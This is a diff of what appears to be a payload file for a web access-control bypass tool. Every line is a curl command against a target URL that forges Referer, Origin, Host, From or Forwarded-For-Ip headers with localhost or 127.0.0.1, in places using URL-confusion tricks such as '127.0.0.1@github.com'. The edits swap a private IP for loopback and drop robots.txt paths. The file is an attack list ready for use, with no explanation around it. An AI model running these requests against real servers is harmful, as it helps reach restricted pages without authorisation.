 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7749,7 +7749,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7763,8 +7763,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7786,22 +7786,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 127.0.0.1 @h
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7812,7 +7812,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7826,8 +7826,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7849,21 +7849,21 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 127.0.0.1 @ht
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Origin: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7874,7 +7874,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1' -H 'Host: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: http://127.0.0.1' -H 'Host: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7919,22 +7919,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: 127.0.0.1 @http
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7945,7 +7945,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7959,8 +7959,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7982,22 +7982,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 127.0.0.1 @http
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'From: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8008,7 +8008,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: htt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
